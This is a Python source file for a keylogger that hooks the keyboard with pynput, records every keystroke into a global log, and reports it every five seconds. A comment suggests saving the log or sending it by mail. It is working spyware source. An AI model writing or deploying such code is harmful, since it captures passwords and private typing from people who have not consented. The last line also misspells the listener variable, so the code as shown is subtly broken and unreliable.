#!/usr/bin/env python

import pynput.keyboard
import threading

log = ""

class Keylogger:
    def process_key_press(self, key):     # the function to execute each time a key is typed
        global log
        try:
            log = log + str(key.char)     # remove the "u" each time
        except AttributeError:
            if key == key.space:
                log = log + " "    
            else:
                log = log + " " + str(key) + " "
    
    def report(self):
        global log
        print(log)      # print or save or send mail here
        log = ""
        timer = threading.Timer(5, self.report)    # split program and run report every 5 seconds
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    # create object
        with keyboard_listener:     # start streaming
            self.report()
            keyboard_listner.join()     # log key typed
